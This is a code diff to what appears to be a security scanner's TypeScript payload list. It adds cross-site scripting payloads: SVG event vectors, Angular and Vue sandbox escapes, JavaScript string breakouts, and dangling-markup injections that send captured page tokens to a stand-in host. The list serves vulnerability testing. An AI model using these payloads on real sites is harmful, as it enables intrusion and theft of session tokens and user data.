@@ -40,12 +40,31 @@ export const XSS_PAYLOADS: XSSPayload[] = [
   { payload: '<marquee onstart="alert(\'secbot-xss-25\')">', marker: 'secbot-xss-25', type: 'event-handler' },
   { payload: '<iframe src="javascript:alert(\'secbot-xss-26\')">', marker: 'secbot-xss-26', type: 'event-handler' },
 
+  // ── SVG animation vectors (bypass tag name filters) ──────────────
+  { payload: '<svg><animate onbegin="alert(\'secbot-xss-48\')" attributeName="x" dur="1s">', marker: 'secbot-xss-48', type: 'event-handler' },
+  { payload: '<svg><set attributeName="onmouseover" to="alert(\'secbot-xss-49\')">', marker: 'secbot-xss-49', type: 'event-handler' },
+  { payload: '<svg><image href=x onerror="alert(\'secbot-xss-50\')">', marker: 'secbot-xss-50', type: 'event-handler' },
+
   // ── Template injection ────────────────────────────────────────────
   { payload: '{{constructor.constructor("alert(\'secbot-xss-27\')")()}}', marker: 'secbot-xss-27', type: 'template' },
   { payload: '${alert("secbot-xss-28")}', marker: 'secbot-xss-28', type: 'template' },
   { payload: '{{alert("secbot-xss-29")}}', marker: 'secbot-xss-29', type: 'template' },
   { payload: '<%= alert("secbot-xss-30") %>', marker: 'secbot-xss-30', type: 'template' },
   { payload: '#{alert("secbot-xss-31")}', marker: 'secbot-xss-31', type: 'template' },
+
+  // ── Framework-specific template injection ───────────────────────
+  // Angular sandbox escape (v1.x)
+  { payload: '{{\'a]".constructor.prototype.charAt=[].join;$eval(\'x]alert(secbot-xss-42)//\');}}', marker: 'secbot-xss-42', type: 'template' },
+  // Angular v1.6+ sandbox escape
+  { payload: '{{$on.constructor("alert(\'secbot-xss-43\')")()}}', marker: 'secbot-xss-43', type: 'template' },
+  // Vue v2 template injection (v-html context or server-side rendering)
+  { payload: '{{_c.constructor("alert(\'secbot-xss-44\')")()}}', marker: 'secbot-xss-44', type: 'template' },
+  // Vue v3 template injection
+  { payload: '{{$el.constructor.constructor("alert(\'secbot-xss-45\')")()}}', marker: 'secbot-xss-45', type: 'template' },
+  // Svelte {@html} context — raw HTML injection
+  { payload: '<img src=x onerror="alert(\'secbot-xss-46\')">', marker: 'secbot-xss-46', type: 'template' },
+  // Pug/Jade template injection
+  { payload: '#{alert("secbot-xss-47")}', marker: 'secbot-xss-47', type: 'template' },
 
   // ── Encoding variants ─────────────────────────────────────────────
   { payload: '&lt;script&gt;alert("secbot-xss-32")&lt;/script&gt;', marker: 'secbot-xss-32', type: 'reflected' },
@@ -85,6 +104,47 @@ export const MUTATION_XSS_PAYLOADS: XSSPayload[] = [
   { payload: '<details open ontoggle=alert("secbot-mxss-6")><summary>x</summary></details>', marker: 'secbot-mxss-6', type: 'event-handler' },
   // Nested template with script
   { payload: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(\'secbot-mxss-7\') /></svg>#x" />', marker: 'secbot-mxss-7', type: 'dom' },
+];
+
+/**
+ * JavaScript string context payloads — for when user input is reflected inside
+ * <script> blocks as JS string literals (e.g., var q = "USER_INPUT").
+ * These break out of the string context and inject executable JavaScript.
+ */
+export const JS_CONTEXT_PAYLOADS: XSSPayload[] = [
+  // Close double-quoted JS string, execute, comment rest
+  { payload: '";alert("secbot-xss-51");//', marker: 'secbot-xss-51', type: 'reflected' },
+  // Close single-quoted JS string
+  { payload: "';alert('secbot-xss-52');//", marker: 'secbot-xss-52', type: 'reflected' },
+  // Close script tag entirely — universal escape from any JS context
+  { payload: '</script><img src=x onerror="alert(\'secbot-xss-53\')">', marker: 'secbot-xss-53', type: 'reflected' },
+  // Backslash escape bypass — when server adds one backslash: \" → \\" → " is free
+  { payload: '\\";alert("secbot-xss-54");//', marker: 'secbot-xss-54', type: 'reflected' },
+  // Line terminator injection (U+2028 breaks JS strings in pre-ES2019 engines)
+  { payload: '\u2028alert("secbot-xss-55")//', marker: 'secbot-xss-55', type: 'reflected' },
+  // JSON context: close JSON value, inject JS via concatenation
+  { payload: '"+alert("secbot-xss-56")+"', marker: 'secbot-xss-56', type: 'reflected' },
+  // Numeric assignment breakout — for var x = USER_INPUT; (no quotes)
+  { payload: '1;alert("secbot-xss-57");//', marker: 'secbot-xss-57', type: 'reflected' },
+];
+
+/**
+ * Dangling markup injection payloads — data exfiltration without JavaScript.
+ * These open an unclosed tag that captures subsequent HTML content
+ * (tokens, CSRF nonces, user data) and sends it to an attacker URL.
+ * Works even under strict CSP because no script execution is needed.
+ */
+export const DANGLING_MARKUP_PAYLOADS: XSSPayload[] = [
+  // Unclosed img src — captures HTML until next matching quote
+  { payload: '"><img src="//secbot-dm.test/exfil?d=', marker: 'secbot-dm-0', type: 'reflected' },
+  // Unclosed form action — captures form tokens on submit
+  { payload: '"><form action="//secbot-dm.test/exfil"><input type=submit>', marker: 'secbot-dm-1', type: 'reflected' },
+  // Base tag hijack — redirects all relative URLs to attacker
+  { payload: '"><base href="//secbot-dm.test/">', marker: 'secbot-dm-2', type: 'reflected' },
+  // Textarea capture — everything after this goes into a visible textarea
+  { payload: '"><textarea>', marker: 'secbot-dm-3', type: 'reflected' },
+  // Meta refresh — exfiltrates page content via redirect URL
+  { payload: '"><meta http-equiv="refresh" content="0;url=//secbot-dm.test/exfil?d=', marker: 'secbot-dm-4', type: 'reflected' },
 ];
 
 /** CSP bypass payloads — exploit weak CSP configurations */
